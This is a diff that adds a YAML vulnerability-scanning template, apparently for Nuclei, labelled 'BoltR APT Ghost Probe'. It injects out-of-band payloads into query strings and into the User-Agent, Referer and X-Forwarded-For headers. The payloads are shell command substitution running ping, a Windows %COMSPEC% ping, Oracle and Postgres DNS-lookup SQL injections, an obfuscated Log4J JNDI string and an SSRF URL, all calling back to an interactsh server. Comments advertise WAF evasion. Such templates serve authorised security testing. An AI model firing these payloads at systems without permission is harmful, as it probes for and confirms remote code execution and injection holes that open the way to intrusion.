@@ -1,0 +1,52 @@
+id: boltr-apt-ghost
+
+info:
+  name: BoltR APT Ghost Probe (OOB)
+  author: BoltR_RedTeam
+  severity: critical
+  description: |
+    Stealthy, Out-of-Band detection for RCE, SSRF, and SQLi. 
+    Does not rely on error messages. Bypasses standard WAF regex.
+  tags: oob, blind, rce, ssrf, apt
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?input={{payload}}"
+      - "{{BaseURL}}"
+
+    headers:
+      # Inject into headers where WAFs often don't look
+      User-Agent: "{{payload}}"
+      Referer: "{{payload}}"
+      X-Forwarded-For: "{{payload}}"
+
+    payloads:
+      payload:
+        # 1. Blind RCE (Unix) - Triggers a ping to our server
+        - "$(ping -c 1 {{interactsh-url}})"
+        # 2. Blind RCE (Windows)
+        - "%COMSPEC% /c ping -n 1 {{interactsh-url}}"
+        # 3. Blind SQLi (Oracle/Postgres) - Triggers DNS lookup
+        - "SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}') FROM DUAL"
+        - "COPY (SELECT '') TO PROGRAM 'nslookup {{interactsh-url}}'"
+        # 4. Log4J / Java Injection (Obfuscated)
+        - "${${::-j}ndi:dns://{{interactsh-url}}/a}"
+        # 5. Generic SSRF Probe
+        - "http://{{interactsh-url}}"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{payload}}"
+
+    # We do NOT match text. We only care if the server pinged us.
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # This checks the OOB server logs
+        words:
+          - "dns"
+          - "http"
